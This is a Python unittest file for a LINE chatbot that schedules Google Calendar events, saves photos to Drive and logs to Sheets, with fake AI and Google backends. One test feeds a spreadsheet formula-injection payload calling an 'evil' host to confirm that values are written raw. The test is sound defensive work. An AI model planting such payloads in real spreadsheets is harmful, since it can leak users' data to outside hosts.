"""Teacher feature tests never write to a real Google account or send LINE messages."""
import io
import json
import subprocess
import tempfile
import threading
import unittest
from datetime import datetime
from pathlib import Path
from unittest.mock import patch

from PIL import Image
import line_bot_local as bot
from test_line_bot_local import NOW, USER


def event(raw="明天下午三點開會", identifier="evt-google", kind="text"):
    return dict(type="message", webhookEventId=identifier, replyToken="test-reply", **USER,
                message=dict(type=kind, **(dict(text=raw) if kind == "text" else dict(id="12345"))))


class FakeAI:
    def __init__(self):
        self.calls = []

    def extract_event(self, text):
        self.calls.append(("event", text))
        return bot.validate_event("明天下午三點開會", dict(isEvent=True, title="開會", date="2026-10-11", time="15:00"), NOW)

    def describe_image(self, image, model):
        self.calls.append(("image", model))
        return "照片顯示一個藍色方塊。"

    def ask(self, raw, conversation):
        self.calls.append(("ask", raw))
        return "回答完成"


class FakeGoogle:
    sheet_id = "test-sheet-only"

    def __init__(self):
        self.calls = []

    def save_photo(self, image, key):
        self.calls.append(("drive", key))
        return "https://drive.google.com/file/d/test-only/view"

    def add_calendar(self, ev, key):
        self.calls.append(("calendar", key))
        return "https://calendar.google.com/calendar/event?eid=test-only"

    def write_sheet(self, row):
        self.calls.append(("sheet", row))
        return True


class TeacherFeatureTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.path = Path(self.temp.name)
        self.ai, self.google = FakeAI(), FakeGoogle()
        image = io.BytesIO()
        Image.new("RGB", (300, 400), "blue").save(image, "PNG")
        self.image = image.getvalue()

    def tearDown(self):
        self.temp.cleanup()

    def teacher(self, **kwargs):
        defaults = dict(ai=self.ai, google=self.google, enabled=True, owner_id="alice", token="test-token",
                        sheet_logging=True,
                        http=lambda *a, **k: self.image, state_file=self.path / "google.json", clock=lambda: NOW)
        return bot.TeacherFeatures(**(defaults | kwargs))

    def test_event_validation_rejects_invalid_and_hallucinated_dates(self):
        valid = dict(isEvent=True, title="開會", date="2026-10-11", time="15:00-16:00")
        self.assertIsNotNone(bot.validate_event("明天下午三點開會", valid, NOW))
        self.assertIsNotNone(bot.validate_event("明天下午三點開會", valid | dict(time="15:00:00"), NOW))
        self.assertIsNone(bot.validate_event("明天開會", valid, NOW))
        self.assertTrue(bot.event_candidate("明天下午三點開會"))
        self.assertFalse(bot.event_candidate("明天有什麼新聞？"))
        for raw, value in [("明天下午三點開會", valid | dict(date="2026-10-12")),
                           ("10月12日開會", valid), ("2月30日開會", valid | dict(date="2026-02-28")),
                           ("幫我開會", valid), ("明天開會", valid | dict(time="25:99")),
                           ("明天開會", valid | dict(time="16:00-15:00")),
                           ("明天開會", valid | dict(isEvent=False))]:
            self.assertIsNone(bot.validate_event(raw, value, NOW), raw)

    def test_calendar_requires_owner_private_chat_and_confirmation(self):
        teacher = self.teacher()
        preview = teacher.before_text("明天下午三點開會", event())
        self.assertIn("待確認行程", preview)
        self.assertEqual(self.google.calls, [])
        stranger = event("確認排程") | dict(source=dict(type="user", userId="bob"))
        self.assertIn("綁定者", teacher.before_text("確認排程", stranger))
        group = event("確認排程") | dict(source=dict(type="group", userId="alice", groupId="test-group"))
        self.assertIn("個人聊天", teacher.before_text("確認排程", group))
        reopened = self.teacher()
        reply = reopened.before_text("確認排程", event("確認排程", "confirm"))
        self.assertIn("已排進 Google 日曆", reply)
        self.assertEqual([c[0] for c in self.google.calls], ["calendar"])
        self.assertIn("沒有可確認", reopened.before_text("確認排程", event()))

    def test_cancel_expiry_and_disabled_google_never_write(self):
        teacher = self.teacher()
        teacher.before_text("明天下午三點開會", event())
        self.assertIn("已取消", teacher.before_text("取消排程", event()))
        self.assertIn("沒有可確認", teacher.before_text("確認排程", event()))
        teacher.before_text("明天下午三點開會", event())
        teacher.clock = lambda: NOW + 1201
        self.assertIn("沒有可確認", teacher.before_text("確認排程", event()))
        teacher = self.teacher(enabled=False)
        self.assertIn("尚未啟用", teacher.before_text("明天下午三點開會", event()))
        self.assertEqual(self.google.calls, [])

    def test_drive_vision_sheet_workflow_persists_dedup(self):
        teacher = self.teacher()
        incoming = event(kind="image")
        reply = teacher.image(incoming)
        self.assertIn("藍色方塊", reply)
        self.assertIn("照片已存進 Google Drive", reply)
        self.assertIn("已記進 Google 試算表", reply)
        self.assertEqual([c[0] for c in self.google.calls], ["drive", "sheet"])
        self.teacher().image(incoming)
        self.assertEqual([c[0] for c in self.google.calls], ["drive", "sheet"])
        self.assertEqual(self.google.calls[1][1][2], "（照片）")

    def test_unbound_image_keeps_local_vision_without_cloud_writes(self):
        incoming = event(kind="image") | dict(source=dict(type="user", userId="bob"))
        reply = self.teacher().image(incoming)
        self.assertIn("藍色方塊", reply)
        self.assertIn("未上傳", reply)
        self.assertEqual(self.google.calls, [])

    def test_google_failure_is_redacted_and_not_retried_after_restart(self):
        class FailingGoogle(FakeGoogle):
            def save_photo(self, image, key):
                self.calls.append(("drive", key))
                raise RuntimeError("secret-token and private-sheet-id must not leak")
        google = FailingGoogle()
        teacher = self.teacher(google=google)
        reply = teacher.image(event(kind="image"))
        self.assertIn("結果未確認", reply)
        self.assertNotIn("secret-token", reply)
        self.assertNotIn("private-sheet-id", reply)
        self.teacher(google=google).image(event(kind="image"))
        self.assertEqual([c[0] for c in google.calls].count("drive"), 1)

    def test_image_event_only_stages_calendar_and_vision_failure_is_honest(self):
        self.ai.describe_image = lambda *a: "明天下午三點開會"
        reply = self.teacher().image(event(kind="image"))
        self.assertIn("待確認行程", reply)
        self.assertNotIn("calendar", [c[0] for c in self.google.calls])
        def fail(*args):
            raise ValueError("no vision")
        self.ai.describe_image = fail
        reply = self.teacher().image(event(kind="image", identifier="second"))
        self.assertIn("暫時無法辨識", reply)
        self.assertIn("照片已存進", reply)

    def test_sheet_preserves_source_cards_and_skips_greetings_and_strangers(self):
        teacher = self.teacher()
        messages = [dict(type="text", text="回答 [1]"), dict(type="flex", altText="來源", contents={})]
        reply = teacher.record(event("今天新聞", "news"), messages)
        self.assertEqual(reply[1], messages[1])
        self.assertIn("已記進", reply[0]["text"])
        self.assertEqual(messages[0]["text"], "回答 [1]")
        teacher.record(event("你好", "hello"), "嗨")
        teacher.record(event("新聞", "stranger") | dict(source=dict(type="user", userId="bob")), "回答")
        self.assertEqual(len(self.google.calls), 1)

    def test_disabled_sheet_logging_keeps_drive_calendar_and_answers(self):
        teacher = self.teacher(sheet_logging=False)
        answer = [dict(type="text", text="回答"), dict(type="flex", contents={})]
        self.assertEqual(teacher.record(event("今天新聞"), answer), answer)
        self.assertNotIn("已記進", teacher.image(event(kind="image", identifier="photo-no-log")))
        teacher.before_text("明天下午三點開會", event(identifier="schedule-no-log"))
        reply = teacher.before_text("確認排程", event(identifier="confirm-no-log"))
        self.assertEqual(teacher.record(event("確認排程"), reply, kind="行程"), reply)
        self.assertEqual([c[0] for c in self.google.calls], ["drive", "calendar"])

    def test_sheet_keeps_results_without_casual_or_schedule_preview_noise(self):
        teacher = self.teacher()
        for i, raw in enumerate(["謝謝！", "好喔", "你好，謝謝", "測試一下", "在嗎？"]):
            self.assertEqual(teacher.record(event(raw, str(i)), "回覆"), "回覆")
        teacher.record(event("明天下午三點開會", "preview"), "請確認行程", kind="行程")
        teacher.record(event("取消排程", "cancel"), "已取消待確認行程", kind="行程")
        teacher.record(event("確認排程", "missing"), "沒有可確認的行程", kind="行程")
        teacher.record(event("今天新聞", "failed"), "本機模型暫時無法回答，請稍後再試。")
        self.assertEqual(self.google.calls, [])
        teacher.record(event("確認排程", "done"), "已排進 Google 日曆：開會", kind="行程")
        teacher.record(event("好喔，解釋牛頓第二定律", "question"), "F = ma")
        self.assertEqual(len(self.google.calls), 2)
        self.assertEqual(self.google.calls[0][1][1], "行程")
        self.assertEqual(self.google.calls[0][1][5], "已建立")

    def test_gws_commands_use_no_shell_raw_sheet_values_and_private_events(self):
        calls = []
        def run(command, **kwargs):
            calls.append((command, kwargs))
            if command[1:4] == ["sheets", "spreadsheets", "values"]:
                data = dict(updates=dict(updatedRows=1))
            else:
                data = dict(id="test-only", htmlLink="https://calendar.google.com/test")
            return subprocess.CompletedProcess(command, 0, json.dumps(data), "")
        google = bot.GoogleWorkspace("gws-test", sheet_id="test-sheet-only", run=run)
        google.write_sheet(["=IMPORTXML(\"http://evil\",\"//x\")"])
        params = json.loads(calls[0][0][calls[0][0].index("--params") + 1])
        self.assertEqual(params["valueInputOption"], "RAW")
        parsed = self.ai.extract_event("明天下午三點開會")
        google.add_calendar(parsed, "stable-event-key")
        body = json.loads(calls[1][0][calls[1][0].index("--json") + 1])
        self.assertNotIn("attendees", body)
        self.assertEqual(body["start"]["timeZone"], "Asia/Taipei")
        self.assertEqual(len(body["id"]), 64)
        self.assertFalse(calls[0][1].get("shell", False))
        google.run = lambda *a, **k: subprocess.CompletedProcess([], 1, "", "private credential")
        with self.assertRaises(RuntimeError) as error:
            google.write_sheet(["test"])
        self.assertNotIn("private credential", str(error.exception))

    def test_gws_photo_upload_is_temporary_private_and_folder_name_escaped(self):
        calls, temporary = [], []
        def run(command, **kwargs):
            calls.append((command, kwargs))
            if command[1:4] == ["drive", "files", "list"]:
                data = dict(files=[dict(id="test-folder")])
            else:
                temporary.append(Path(kwargs["cwd"]))
                self.assertEqual(Path(kwargs["cwd"], "photo.jpg").read_bytes(), b"image")
                data = dict(id="test-photo", webViewLink="https://drive.google.com/test")
            return subprocess.CompletedProcess(command, 0, json.dumps(data), "")
        google = bot.GoogleWorkspace("gws-test", folder="photo's folder", run=run)
        self.assertEqual(google.save_photo(b"image", "evt"), "https://drive.google.com/test")
        params = json.loads(calls[0][0][calls[0][0].index("--params") + 1])
        self.assertIn("photo\\'s folder", params["q"])
        self.assertFalse(temporary[0].exists())
        self.assertNotIn("permissions", " ".join(calls[1][0]))

    def test_vision_model_capability_and_structured_calendar_format(self):
        calls = []
        def http(url, **kwargs):
            calls.append((url, kwargs))
            return json.dumps(dict(capabilities=["vision"]) if url.endswith("/api/show") else dict(message=dict(content="照片內容"))).encode()
        ai = bot.LocalAI(http=http)
        self.assertEqual(ai.describe_image(b"image"), "照片內容")
        self.assertEqual(calls[1][1]["json"]["model"], "gemma4:e2b-it-q4_K_M")
        self.assertIn("images", calls[1][1]["json"]["messages"][0])
        ai.http = lambda *a, **k: b'{"capabilities":["completion"]}'
        with self.assertRaises(ValueError):
            ai.describe_image(b"image", "qwen2.5:3b")

    def test_webhook_accepts_images_validates_id_and_preserves_todo_routes(self):
        done, replies = threading.Event(), []
        teacher = self.teacher()
        def sender(received, answer):
            replies.append(answer)
            done.set()
        runtime = bot.BotRuntime("test-secret", "test-token", bot.TodoStore(self.path / "todos"), self.ai,
                                 teacher=teacher, sender=sender)
        client = bot.create_app(runtime).test_client()
        import base64, hashlib, hmac
        def post(incoming):
            body = json.dumps(dict(events=[incoming])).encode()
            signed = base64.b64encode(hmac.new(b"test-secret", body, hashlib.sha256).digest()).decode()
            return client.post("/webhook", data=body, headers={"x-line-signature": signed})
        try:
            self.assertEqual(post(event(kind="image")).status_code, 200)
            self.assertTrue(done.wait(2))
            self.assertIn("藍色方塊", replies[0])
            malformed = event(kind="image")
            malformed["message"]["id"] = 123
            self.assertEqual(post(malformed).status_code, 400)
            done.clear()
            self.assertEqual(post(event("記錄：星期五交報告", "todo")).status_code, 200)
            self.assertTrue(done.wait(2))
            self.assertIn("已記錄", replies[-1])
            self.assertNotIn("已記進 Google", replies[-1])
        finally:
            runtime.close()


if __name__ == "__main__":
    unittest.main(verbosity=2)
